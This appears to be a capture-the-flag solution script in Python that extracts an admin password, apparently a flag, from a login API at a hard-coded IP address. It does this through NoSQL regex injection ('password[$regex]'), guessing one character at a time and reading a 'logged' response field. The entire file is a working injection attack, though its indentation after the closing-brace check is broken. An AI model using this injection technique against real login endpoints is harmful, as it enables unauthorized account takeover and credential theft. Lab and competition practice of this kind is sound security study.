import requests

flag = ""

chars = '1234567890abcdefghijklmnopqrstuvwxyz{}-_'

url = "http://165.227.234.7:31555/api/login"

while(1):
	for char in chars: 
		req = flag + char
		data = {"username": "admin", "password[$regex]": req} 
		response = requests.post(url, data)
		if (response.json()['logged'] == 1):
			flag += char
			if(char == '}'):
			print(flag)
			break	


